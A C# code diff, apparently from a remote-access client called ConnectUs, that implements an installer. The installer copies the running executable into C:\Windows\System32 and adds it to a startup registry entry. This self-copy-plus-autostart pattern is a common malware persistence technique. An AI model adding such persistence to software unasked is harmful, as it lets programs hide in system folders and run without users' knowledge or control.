@@ -1,3 +1,5 @@
+using System.IO;
+
 namespace ConnectUs.Core.ClientSide
 {
     public class Installer : IInstaller
@@ -5,20 +7,30 @@ namespace ConnectUs.Core.ClientSide
         private const string RootPath = @"C:\Windows\System32\";
 
         private readonly IEnvironment _environment;
+        private readonly IFileService _fileService;
+        private readonly IRegistry _registry;
 
-        public Installer(IEnvironment environment)
+        public Installer(IEnvironment environment, IFileService fileService, IRegistry registry)
         {
             _environment = environment;
+            _fileService = fileService;
+            _registry = registry;
         }
 
         public bool IsInstalled
         {
-            get { return _environment.CurrentParentFolder.Contains(RootPath); }
+            get { return _environment.ApplicationPath.Contains(RootPath); }
         }
 
         public string Install()
         {
-            throw new System.NotImplementedException();
+            var fileName = Path.GetFileName(_environment.ApplicationPath);
+            var targetFilePath = Path.Combine(RootPath, fileName);
+
+            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
+            _registry.AddInStartupRegistry(targetFilePath);
+
+            return targetFilePath;
         }
     }
 }
